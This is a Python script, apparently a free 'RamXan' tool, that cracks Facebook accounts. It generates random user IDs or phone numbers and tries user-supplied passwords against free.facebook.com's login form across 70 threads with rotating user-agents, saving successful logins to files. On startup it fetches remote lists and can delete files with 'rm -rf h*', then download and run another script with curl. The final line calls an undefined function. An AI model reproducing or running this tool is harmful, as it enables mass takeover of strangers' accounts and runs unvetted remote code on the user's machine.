#coding=utf
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python hop.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

logo =                                          """   
        \033[1;95m88888888888 8888888b  88888888888 
          \033[1;93m  888     888   Y88b    888     
        \033[1;92m    888     888    888    888     
        \033[1;91m    888     888   d88P    888     
        \033[1;96m    888     8888888P"     888     
         \033[1;92m   888     888 T88b      888     
         \033[1;93m   888     888  T88b     888     
          \033[1;95m  888     888   T88b    888     
\x1b[1;97m------------------------\x1b[1;97m------------------------
\n\x1b[1;92m   ADMIN : \x1b[1;97mRamXan   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.2.0

         \x1b[1;92m  WHATSAPP: \x1b[1;95m+923059361667
          \x1b[1;92m FACEBOOK:  \x1b[1;95mRamXan Tanha
\033[1;37m------------------------\033[1;37m------------------------ """ 
loop = 0
oks = []
cps = []
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    proxy = requests.get('https://raw.githubusercontent.com/ramzantanha/RamXan/main/tr.txt').text.splitlines()
    v = 5.2
    update = requests.get('https://raw.githubusercontent.com/ramzantanha/RamXan/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf h*')
        os.system('curl -L https://raw.githubusercontent.com/Hamzahash/hop/main/hop.py > hop.py')
        os.system('python hop.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def main():
    os.system('clear')
    print(logo)
    print('[1] Random crack')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_crack()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('[1] Random UID crack')
    print('[2] Random number crack')
    print('[B] Back')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_uid()
    elif opt =='2':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_uid():
    user=[]
    os.system('clear')
    print(logo)
    limit = int(input('How many ids do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append('10000'+nmp)
    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')
    pwx = input('Put passwords: ').split(',')
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for uid in user:
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')
def random_number():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;33mCode example: 92301,92302,92305,92306 ...\033[0;97m')
    kode = input('Put code: ')
    limit = int(input('How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for guru in user:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(proxy)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'free.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9,en;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="100", "Chromium";v="100"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'none',
            'sec-fetch-user': 'empty',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[RamXan-OK] '+cid+' | '+ps+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[RamXan-CP] '+cid+' | '+ps+'\033[0;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r   [%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

rmzn()
